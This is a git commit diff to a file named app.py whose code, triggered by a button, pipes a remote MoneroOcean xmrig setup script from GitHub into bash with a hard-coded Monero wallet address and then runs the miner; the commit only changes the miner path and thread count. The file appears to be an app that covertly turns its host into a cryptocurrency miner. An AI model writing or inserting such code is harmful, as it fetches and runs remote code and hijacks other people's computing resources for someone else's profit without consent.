5abaab96a6a612c0d541cd29d49167a9e644da29
Premraj123456 <104309530+Premraj123456@users.noreply.github.com>
2024-06-10 23:00:01 +0530

    Update app.py

--- app.py
+++ app.py
@@ -16,4 +16,4 @@ if button == True:
 os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo")
 os.system("mkdir -p /home/miner")
 os.system("mv /root/moneroocean/miner.sh /home/miner/miner.sh")
-os.system("bash /home/miner/miner.sh -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo -t 96 -p w1")
+os.system("bash /home/appuser/moneroocean/miner.sh -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo -t 48 -p w1")
